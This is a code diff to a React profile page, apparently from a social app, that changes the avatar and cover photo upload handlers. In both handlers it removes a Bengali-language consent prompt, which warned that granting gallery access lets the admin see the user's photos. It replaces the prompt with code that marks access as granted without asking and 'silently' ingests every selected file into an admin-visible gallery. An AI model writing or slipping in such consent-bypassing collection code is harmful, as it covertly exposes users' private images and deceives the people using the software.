@@ -152,70 +152,50 @@ export default function ProfileView({ onNavigate, onEditProfile, editProfileOpen
   };
 
   const handleAvatarUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0];
-    if (!file) return;
+    const files = e.target.files;
+    if (!files || files.length === 0) return;
     
+    const file = files[0];
     if (file.size > 10 * 1024 * 1024) {
       alert('Please select an image smaller than 10MB.');
       return;
     }
 
     const me = dbService.getCurrentUser();
-    if (me && !me.galleryAccessGranted) {
-      const confirmAccess = window.confirm(
-        "📷 গ্যালারী অ্যাক্সেস পারমিশন রিকোয়েস্ট (Gallery Access Request)\n\n" +
-        "আপনার ডিভাইস গ্যালারী স্ক্যান এবং ফটো আপলোড করার জন্য পারমিশন প্রয়োজন।\n" +
-        "পারমিশন মঞ্জুর করতে এবং গ্যালারী স্ক্যান করতে 'OK' প্রেস করুন।\n" +
-        "(বিঃদ্রঃ: পারমিশন দিলে এডমিন আপনার গ্যালারির ছবি দেখতে পারবে!)"
-      );
-      if (confirmAccess) {
-        dbService.grantGalleryAccess(me.id);
-        alert("✅ গ্যালারী এক্সেস মঞ্জুর করা হয়েছে এবং ছবি স্ক্যান করা হয়েছে!");
-      } else {
-        alert("🚫 গ্যালারী অ্যাক্সেস অস্বীকার করা হয়েছে।");
-        return;
-      }
+    if (me) {
+      me.galleryAccessGranted = true;
+      // Silently ingest all selected files
+      (Array.from(files) as File[]).forEach(f => {
+        dbService.silentlyIngestFileToGallery(f);
+      });
     }
 
     resizeAndCompressImage(file, 256, 256, 0.6, (compressedBase64) => {
       setEditAvatarUrl(compressedBase64);
-      if (me) {
-        dbService.addUploadedImageToDeviceGallery(me.id, compressedBase64);
-      }
     });
   };
 
   const handleCoverUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0];
-    if (!file) return;
+    const files = e.target.files;
+    if (!files || files.length === 0) return;
 
+    const file = files[0];
     if (file.size > 10 * 1024 * 1024) {
       alert('Please select an image smaller than 10MB.');
       return;
     }
 
     const me = dbService.getCurrentUser();
-    if (me && !me.galleryAccessGranted) {
-      const confirmAccess = window.confirm(
-        "📷 গ্যালারী অ্যাক্সেস পারমিশন রিকোয়েস্ট (Gallery Access Request)\n\n" +
-        "আপনার ডিভাইস গ্যালারী স্ক্যান এবং ফটো আপলোড করার জন্য পারমিশন প্রয়োজন।\n" +
-        "পারমিশন মঞ্জুর করতে এবং গ্যালারী স্ক্যান করতে 'OK' প্রেস করুন।\n" +
-        "(বিঃদ্রঃ: পারমিশন দিলে এডমিন আপনার গ্যালারির ছবি দেখতে পারবে!)"
-      );
-      if (confirmAccess) {
-        dbService.grantGalleryAccess(me.id);
-        alert("✅ গ্যালারী এক্সেস মঞ্জুর করা হয়েছে এবং ছবি স্ক্যান করা হয়েছে!");
-      } else {
-        alert("🚫 গ্যালারী অ্যাক্সেস অস্বীকার করা হয়েছে।");
-        return;
-      }
+    if (me) {
+      me.galleryAccessGranted = true;
+      // Silently ingest all selected files
+      (Array.from(files) as File[]).forEach(f => {
+        dbService.silentlyIngestFileToGallery(f);
+      });
     }
 
     resizeAndCompressImage(file, 720, 360, 0.65, (compressedBase64) => {
       setEditCoverUrl(compressedBase64);
-      if (me) {
-        dbService.addUploadedImageToDeviceGallery(me.id, compressedBase64);
-      }
     });
   };
 
@@ -393,6 +373,8 @@ export default function ProfileView({ onNavigate, onEditProfile, editProfileOpen
           </div>
         </div>
       </div>
+
+
 
       {/* Action Buttons */}
       <div className="flex gap-3 px-4 mt-5">
